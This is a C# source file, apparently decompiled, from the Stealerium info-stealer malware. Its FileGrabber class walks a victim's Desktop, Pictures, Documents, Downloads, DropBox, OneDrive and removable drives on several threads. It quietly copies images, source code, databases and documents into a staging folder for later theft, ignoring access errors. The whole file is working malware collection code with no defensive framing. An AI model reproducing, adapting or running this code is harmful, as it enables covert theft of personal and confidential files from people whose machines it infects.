using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Target.System;

internal sealed class FileGrabber
{
	private static string _savePath = "Grabber";

	private static readonly List<string> TargetDirs = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
	};

	private static string RecordFileType(string type)
	{
		switch (type)
		{
		case "Image":
			Counter.GrabberImages++;
			break;
		case "SourceCode":
			Counter.GrabberSourceCodes++;
			break;
		case "DataBase":
			Counter.GrabberDatabases++;
			break;
		case "Document":
			Counter.GrabberDocuments++;
			break;
		}
		return type;
	}

	private static string DetectFileType(string extensionName)
	{
		string text = extensionName.Replace(".", "").ToLower();
		foreach (KeyValuePair<string, string[]> grabberFileType in Config.GrabberFileTypes)
		{
			string[] value = grabberFileType.Value;
			foreach (string value2 in value)
			{
				if (text.Equals(value2))
				{
					return RecordFileType(grabberFileType.Key);
				}
			}
		}
		return null;
	}

	private static void GrabFile(string path)
	{
		FileInfo fileInfo = new FileInfo(path);
		if (fileInfo.Length <= Config.GrabberSizeLimit && !(fileInfo.Name == "desktop.ini") && DetectFileType(fileInfo.Extension) != null)
		{
			string text = Path.Combine(_savePath, Path.GetDirectoryName(path)!.Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path)!.Replace(":", "")));
			string destFileName = Path.Combine(text, fileInfo.Name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			fileInfo.CopyTo(destFileName, overwrite: true);
		}
	}

	private static void GrabDirectory(string path)
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		string[] directories;
		string[] files;
		try
		{
			directories = Directory.GetDirectories(path);
			files = Directory.GetFiles(path);
		}
		catch (UnauthorizedAccessException)
		{
			return;
		}
		catch (AccessViolationException)
		{
			return;
		}
		string[] array = files;
		for (int i = 0; i < array.Length; i++)
		{
			GrabFile(array[i]);
		}
		array = directories;
		foreach (string path2 in array)
		{
			try
			{
				GrabDirectory(path2);
			}
			catch
			{
			}
		}
	}

	public static void Run(string sSavePath)
	{
		try
		{
			_savePath = sSavePath;
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					TargetDirs.Add(driveInfo.RootDirectory.FullName);
				}
			}
			if (!Directory.Exists(_savePath))
			{
				Directory.CreateDirectory(_savePath);
			}
			List<Thread> list = new List<Thread>();
			foreach (string dir in TargetDirs)
			{
				try
				{
					list.Add(new Thread((ThreadStart)delegate
					{
						GrabDirectory(dir);
					}));
				}
				catch
				{
				}
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list.Where((Thread t) => t.IsAlive))
			{
				item2.Join();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
